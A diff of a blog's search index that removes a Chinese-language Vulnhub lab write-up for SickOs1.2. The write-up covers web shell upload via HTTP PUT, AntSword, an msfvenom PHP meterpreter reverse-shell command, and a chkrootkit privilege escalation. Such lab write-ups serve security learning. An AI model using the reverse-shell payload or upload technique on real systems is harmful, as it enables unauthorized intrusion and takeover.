@@ -1,41 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>test</title>
-    <url>/2020/03/15/test/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>SickOs1.2</title>
-    <url>/2020/03/15/SickOs1-2/</url>
-    <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/15/SickOs1-2/image-20200315180547120.png" alt="image-20200315180547120"></p>
-<p>dirb扫目录 发现个test</p>
-<p><img src="/2020/03/15/SickOs1-2/image-20200315181814090.png" alt="image-20200315181814090"></p>
-<p><img src="/2020/03/15/SickOs1-2/image-20200315185800832.png" alt="image-20200315185800832"></p>
-<h1 id="0x01-获取shell"><a href="#0x01-获取shell" class="headerlink" title="0x01 获取shell"></a><strong>0x01 获取shell</strong></h1><p>发现可以PUT 那么试试直接上传文件</p>
-<p><img src="/2020/03/15/SickOs1-2/image-20200315185640271.png" alt="image-20200315185640271"></p>
-<p><img src="/2020/03/15/SickOs1-2/image-20200315185902815.png" alt="image-20200315185902815"></p>
-<p>连接成功</p>
-<p><img src="/2020/03/15/SickOs1-2/image-20200315190043984.png" alt="image-20200315190043984"></p>
-<p>用的中国蚁剑 打开虚拟终端</p>
-<p><img src="/2020/03/15/SickOs1-2/image-20200315190529395.png" alt="image-20200315190529395"></p>
-<p><img src="/2020/03/15/SickOs1-2/image-20200315190947639.png" alt="image-20200315190947639"></p>
-<h1 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a><strong>0x02 提权</strong></h1><p>还是老规矩msf走起</p>
-<p>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=443 &gt;/root/shell_443.php  用中国蚁剑上传上去 本地监听 拿到shell</p>
-<p><img src="/2020/03/15/SickOs1-2/image-20200315201428099.png" alt="image-20200315201428099"></p>
-<p>shell放到后台 search chkrootokit的exp然后加载到后台shell里<br>注意这是443会被重置为exp里设定的4444<br>由于靶机防火墙不允许非常用端口的使用所以我们需要使用443来操作<br>重新set lport 443</p>
-<p><img src="/2020/03/15/SickOs1-2/image-20200315201530617.png" alt="image-20200315201530617"></p>
-<p><img src="/2020/03/15/SickOs1-2/image-20200315201742942.png" alt="image-20200315201742942"></p>
-<p>拿到root！</p>
-]]></content>
-      <categories>
-        <category>靶机</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub 靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SickOs1.1</title>
     <url>/2020/03/15/SickOs1-1/</url>
     <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/15/SickOs1-1/image-20200315143529889.png" alt="image-20200315143529889"></p>
